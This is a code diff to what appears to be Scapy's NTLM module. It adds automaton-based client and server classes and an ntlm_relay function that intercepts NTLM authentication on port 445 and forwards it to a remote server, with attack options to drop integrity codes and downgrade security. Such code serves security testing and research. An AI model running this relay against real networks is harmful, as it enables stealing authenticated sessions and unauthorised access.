@@ -12,7 +12,9 @@ https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-NLMP/%
 import socket
 import struct
 
-from scapy.ansmachine import AnsweringMachineTCP
+from scapy.arch import get_if_addr
+from scapy.asn1.asn1 import ASN1_STRING
+from scapy.automaton import Automaton, ObjectPipe
 from scapy.compat import bytes_base64
 from scapy.config import conf
 from scapy.fields import (
@@ -43,6 +45,7 @@ from scapy.packet import Packet
 from scapy.sessions import StringBuffer
 from scapy.supersocket import StreamSocket
 
+import scapy.modules.six as six
 from scapy.compat import (
     Any,
     Dict,
@@ -78,8 +81,11 @@ class _NTLMPayloadField(_StrField[List[Tuple[str, Any]]]):
             return []
         results = []
         for field in self.fields:
-            length = pkt.getfieldval(field.name + "Len")
             offset = pkt.getfieldval(field.name + "BufferOffset") - self.offset
+            try:
+                length = pkt.getfieldval(field.name + "Len")
+            except AttributeError:
+                length = len(x) - offset
             if offset < 0:
                 continue
             if x[offset:offset + length]:
@@ -477,7 +483,118 @@ def HTTP_ntlm_negotiate(ntlm_negotiate):
 
 # Answering machine
 
-class NTLM_Relay(AnsweringMachineTCP):
+
+class _NTLM_Automaton(Automaton):
+    def __init__(self, sock, **kwargs):
+        # type: (StreamSocket, Any) -> None
+        self.token_pipe = ObjectPipe()
+        self.values = {}
+        for key, dflt in [("DROP_MIC", False)]:
+            setattr(self, key, kwargs.pop(key, dflt))
+        super(_NTLM_Automaton, self).__init__(
+            recvsock=lambda **kwargs: sock,
+            ll=lambda **kwargs: sock,
+            **kwargs
+        )
+
+    def _get_token(self, token):
+        from scapy.layers.gssapi import (
+            GSSAPI_BLOB,
+            SPNEGO_negToken,
+            SPNEGO_Token
+        )
+
+        negResult = None
+        MIC = None
+        if not token:
+            return None, negResult, MIC
+        if isinstance(token, bytes):
+            return NTLM_Header(token), negResult, MIC
+        if isinstance(token, conf.raw_layer):
+            return NTLM_Header(token.load), negResult, MIC
+        if isinstance(token, GSSAPI_BLOB):
+            token = token.innerContextToken
+        if isinstance(token, SPNEGO_negToken):
+            token = token.token
+        if hasattr(token, "mechListMIC") and token.mechListMIC:
+            MIC = token.mechListMIC.value
+        if hasattr(token, "negResult"):
+            negResult = token.negResult
+        try:
+            ntlm = token.mechToken
+        except AttributeError:
+            ntlm = token.responseToken
+        if isinstance(ntlm, SPNEGO_Token):
+            ntlm = ntlm.value
+        if isinstance(ntlm, ASN1_STRING):
+            ntlm = NTLM_Header(ntlm.val)
+        if isinstance(ntlm, conf.raw_layer):
+            ntlm = NTLM_Header(ntlm.load)
+        return ntlm, negResult, MIC
+
+    def received_ntlm_token(self, ntlm):
+        self.token_pipe.send(ntlm)
+
+    def get(self, attr, default=None):
+        if default is not None:
+            return self.values.get(attr, default)
+        return self.values[attr]
+
+
+class NTLM_Client(_NTLM_Automaton):
+    """
+    A class to overload to create a client automaton when using the
+    NTLM relay.
+    """
+    port = 445
+    cls = conf.raw_layer
+
+    def bind(self, srv_atmt):
+        # type: (NTLM_Server) -> None
+        self.srv_atmt = srv_atmt
+
+    def set_srv(self, attr, value):
+        self.srv_atmt.values[attr] = value
+
+    def get_token(self):
+        return self.srv_atmt.token_pipe.recv()
+
+    def echo(self, pkt):
+        return self.srv_atmt.send(pkt)
+
+
+class NTLM_Server(_NTLM_Automaton):
+    """
+    A class to overload to create a server automaton when using the
+    NTLM relay.
+    """
+    port = 445
+    cls = conf.raw_layer
+
+    def bind(self, cli_atmt):
+        # type: (NTLM_Client) -> None
+        self.cli_atmt = cli_atmt
+
+    def get_token(self):
+        return self.cli_atmt.token_pipe.recv()
+
+    def set_cli(self, attr, value):
+        self.cli_atmt.values[attr] = value
+
+    def echo(self, pkt):
+        return self.cli_atmt.send(pkt)
+
+
+def ntlm_relay(serverCls,
+               remoteIP,
+               remoteClientCls,
+               # Classic attacks
+               DROP_MIC=False,
+               DOWNGRADE_SECURITY=False,
+               # Optional arguments
+               server_kwargs={},
+               client_kwargs={},
+               iface=None):
     """
     NTLM Relay
 
@@ -485,113 +602,64 @@ class NTLM_Relay(AnsweringMachineTCP):
     various protocols.
 
     Usage example:
-        ntlm_relay(ServerIP="192.168.122.156",
-                   ServerProto=NTLM_Relay.PROTO.SMB,
-                   ClientProto=NTLM_Relay.PROTO.SMB,
+        ntlm_relay(port=445,
+                   remoteIP="192.168.122.65",
+                   remotePort=445,
                    iface="eth0")
-    
-    :param ServerIP: the address IP of the server to connect to for auth
-    :param ServerProto: the proto to connect to the server into
-    :param ClientProto: what the relay is listening to
+
+    :param port: the port to open the relay on
+    :param remoteIP: the address IP of the server to connect to for auth
+    :param remotePort: the proto to connect to the server into
     """
-    function_name = "ntlm_relay"
 
-    class PROTO:
-        SMB = 0
-        HTTP = 1
-        LDAP = 2
+    assert issubclass(
+        serverCls, NTLM_Server), "Specify a correct NTLM server class"
+    assert issubclass(
+        remoteClientCls, NTLM_Client), "Specify a correct NTLM client class"
+    assert remoteIP, "Specify a valid remote IP address"
 
-    def parse_options(self, ServerProto=None,
-                            ServerIP=None,
-                            ClientProto=None,
-                            timeout=None):
-        if ServerIP is None:
-            raise ValueError("Specify ServerIP !")
-        if ServerProto is None:
-            raise ValueError("Specify ServerProto !")
-        if ClientProto is None:
-            raise ValueError("Specify ClientProto !")
-        self.ServerIP = ServerIP
-        self.timeout = timeout
-        self.ServerProto = ServerProto
-        self.ClientProto = ClientProto
-        self.sessions = {}
-        from scapy.layers.netbios import NBTSession
-        from scapy.layers.http import HTTP
-        ports = {
-            self.PROTO.SMB: (445, NBTSession),
-            self.PROTO.HTTP: (80, HTTP),
-            self.PROTO.LDAP: (0, conf.raw_layer),
-        }
-        self.port, self.cls = ports[self.ServerProto]
-        self.clientport, self.clientcls = ports[self.ClientProto]
-        print("NTLM relay %s -> %s" % (self.port, self.clientport))
-
-    def is_request(self, req):
-        """
-        Returns whether a packet should be considered as a request, based
-        on the server proto.
-        """
-        if self.ServerProto == self.PROTO.SMB:
-            from scapy.layers.smb import SMB_Header
-            return SMB_Header in req
-        elif self.ServerProto == self.PROTO.HTTP:
-            from scapy.layers.http import HTTPRequest
-            return HTTPRequest in req
-
-    def get_ntlm_content(self, req):
-        """
-        Returns the NTLM packet based on the server request.
-        """
-        if self.ServerProto == self.PROTO.SMB:
-            from scapy.layers.smb import SMB_Header
-            return SMB_Header in req
-        elif self.ServerProto == self.PROTO.HTTP:
-            from scapy.layers.http import HTTPRequest
-            return HTTPRequest in req
-
-    def get_request(self, req):
-        """
-        Returns what to send the server based on the client request.
-        """
-        ntlm = self.get_ntlm_content(req)
-
-        if self.ServerProto == self.PROTO.SMB:
-            return req
-        elif self.ServerProto == self.PROTO.HTTP:
-            return req
-
-    def get_reply(self, resp):
-        """
-        Returns what to send the client based on the server response.
-        """
-        ntlm = self.get_ntlm_content(resp)
-
-        if self.ClientProto == self.PROTO.SMB:
-            return resp
-        elif self.ClientProto == self.PROTO.HTTP:
-            return resp
-
-    def make_reply(self, req, address=None):
-        if address not in self.sessions:
+    from scapy.supersocket import StreamSocket
+    ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    ssock.bind(
+        (get_if_addr(iface or conf.iface), serverCls.port))
+    ssock.listen()
+    sniffers = []
+    if DROP_MIC:
+        client_kwargs["DROP_MIC"] = True
+        server_kwargs["DROP_MIC"] = True
+    if DOWNGRADE_SECURITY:
+        client_kwargs["EXTENDED_SECURITY"] = False
+        server_kwargs["EXTENDED_SECURITY"] = False
+    try:
+        while True:
+            clientsocket, address = ssock.accept()
+            sock = StreamSocket(clientsocket, serverCls.cls)
+            srv_atmt = serverCls(sock, debug=4, **server_kwargs)
             # Connect to real server
             _sock = socket.socket()
             _sock.connect(
-                (self.ServerIP, self.clientport)
+                (remoteIP, remoteClientCls.port)
             )
-            sock = StreamSocket(_sock, self.clientcls)
-            self.sessions[address] = {
-                "socket": sock,
-                "data": {}
-            }
-        else:
-            sock = self.sessions[address]["socket"]
-        req = self.get_request(req)
-        # Relay
-        resp = sock.sr1(req, timeout=self.timeout, verbose=False)
-        if resp:
-            return self.get_reply(resp)
-
-    def close(self):
-        for session in self.sessions.values():
-            session["socket"].close()
+            print("%s connected -> %s" %
+                  (repr(address), repr(_sock.getsockname())))
+            remote_sock = StreamSocket(_sock, remoteClientCls.cls)
+            cli_atmt = remoteClientCls(remote_sock, debug=4, **client_kwargs)
+            sniffers.append(((srv_atmt, cli_atmt), (sock, remote_sock)))
+            # Bind NTLM functions
+            srv_atmt.bind(cli_atmt)
+            cli_atmt.bind(srv_atmt)
+            # Start automatons
+            srv_atmt.runbg()
+            cli_atmt.runbg()
+    except KeyboardInterrupt:
+        print("Exiting.")
+    finally:
+        for (atmts, socks) in sniffers:
+            for atmt in atmts:
+                try:
+                    atmt.forcestop()
+                except Exception:
+                    pass
+            for sock in socks:
+                sock.close()
+        ssock.close()
